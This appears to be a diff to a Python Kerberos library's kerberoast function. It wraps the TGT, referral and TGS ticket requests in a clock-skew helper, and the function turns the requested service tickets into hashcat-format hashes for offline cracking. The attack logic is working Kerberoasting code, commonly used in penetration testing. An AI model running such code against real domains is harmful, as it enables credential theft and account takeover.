@@ -69,14 +69,14 @@ async def kerberoast(factory:KerberosClientFactory, usernames:List[str], domain:
 	for username in usernames:
 		try:
 			kcomm = factory.get_client()
-			await kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
+			await kcomm.with_clock_skew(kcomm.get_TGT, override_etype = override_etype)
 			spn = KerberosSPN.from_upn('%s@%s' % (username, domain))
 			kcommnew = kcomm
 			if cross_domain is True:
 				#print('Getting referral ticket for %s' % spn.domain)
-				_, _, _, new_factory = await kcomm.get_referral_ticket(spn.domain)
+				_, _, _, new_factory = await kcomm.with_clock_skew(kcomm.get_referral_ticket, spn.domain)
 				kcommnew = new_factory.get_client()
-			tgs, _, _ = await kcommnew.get_TGS(spn, override_etype = override_etype)
+			tgs, _, _ = await kcommnew.with_clock_skew(kcommnew.get_TGS, spn, override_etype = override_etype)
 			yield username, TGSTicket2hashcat(tgs), None
 		except Exception as e:
 			logger.debug('Failed to get TGS ticket for user %s! Reason: %s' % (username, str(e)))
